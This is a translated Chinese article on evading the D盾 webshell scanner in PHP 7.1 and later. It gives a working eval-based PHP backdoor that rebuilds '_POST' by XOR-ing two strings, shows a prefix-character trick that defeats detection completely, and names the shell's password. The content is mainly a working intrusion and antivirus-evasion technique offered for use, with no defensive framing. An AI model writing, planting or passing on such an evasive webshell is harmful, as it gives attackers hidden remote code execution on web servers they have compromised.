# PHP7.1后webshell免杀的去路
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 严格的D盾
D盾说，我是个严格的人，看到eval我就报木马，“看着像“=”就是“木马，宁可错杀一千，绝不放过一个。好了，多说无益，一起看看严格的D盾是如何错杀的。
我随手写一个php文件：代码如下：
很明显没有传参呀，GET和POST都没有，压根儿就不是木马的，但是D盾竟然给我直接报了已知后门，我哭辽，如下：
大家最初的绕过应该大多都是基于”assert”的拆分和隐藏绕过的，但是在php7.1后assert已经被移除了，那么我们这些渗透测试er该何去何从呢？，能否找到新的技巧呢？当然，技巧千千万，找一些少见的函数，少见的特殊字符都是不错的选择。但是我们能否借助在php7.1之前的隐藏和拆分”assert“的思路呢？答案是肯定的，我们可以尝试隐藏和拆分传入eval中的参数来直面eval函数绕过。
## 隐藏POST和GET
在php7.1之后，如果我们转换思路，不再纠结于隐藏assert，eval等命令执行函数(因为assert已经失效，也无法隐藏了，无需隐藏了)，而是直接面对eval，在我上述的例子中大家很容易看到，我就随便往eval中传了一个参数“ccc”，D盾就直接报已知后门了，这足以说明D盾对传入eavl参数的敏感性太高了。那么此时，我们隐藏一下我们一句话木马中常用和必须的GET和POST就有必要了。于是编写如下木马：(注明：此木马D盾会报一级可疑)
    $a = "~+d()"^"!{+{}";
    $b = ${$a}[a];
    eval($b);
简单解释一下：
变量$a的值我是利用异或赋值的，`$a =
"~+d()"^"!{+{}";`，而字符串`"~+d()"^"!{+{}"`异或的结果为`_POST`，我直接输出给大家看看：
`echo $a`即为如下结果：
然后`$b = ${$a}[a];`与`$b =
$_POST[a]`等价，在将其传入eval()中，我们就成功了第一步，我们已经使得D盾报木马的级别降低了，由”5级
已知后门“变为”1级可疑（内藏）Eval后门{参数：$b（未知内容）}“了，哈哈，这就说明此时我们已经成功隐藏了我们所传入的参数，但是D盾在这里有点“我不认识的都可疑，宁可错杀一千，绝不放过一个了”，既然D盾这么较真，我们也较真点，彻底绕过。
经过上述测试发现，D盾只要在eval函数内发现了它未能识别的参数就会报出可疑，未知内容，又由于我们从一开始的切入点就是eval中的参数，所以此时我依旧针对eval中的参数进行处理：处理后的结果如下：
我们仅仅在参数`$b`的前面加上`“n"`就成功绕过了，当然同理，你也可以在参数$b的前面加上`""`、`"t"`、`"r"`等等也是可以绕过的。
木马密码：a
d盾扫描结果：
## 总结
在php7.1之后，显而易见的是免杀的难度大大增加了，因为灵活的assert被抛弃了，我们再也没有办法通过回调函数调用assert，或者其他的方式隐藏，拆分，调用assert，隐蔽的传参给assert。这个时候我们必须直面eval了，从传入eval的参数入手，隐藏GET和POST，配合一些特殊字符打乱正则，方可达到绕过检测的目的。当然也不排除使用特殊函数绕过。现在还能大量发表绕过的方法完全是因为现在还没有完全过度到php7.1之后，等到完全过度到php7.1之后估计大家的免杀马都要捂着用了，因为免杀的难度和代价变大了。此文供大家日后面对php7.1之后的环境参考绕过。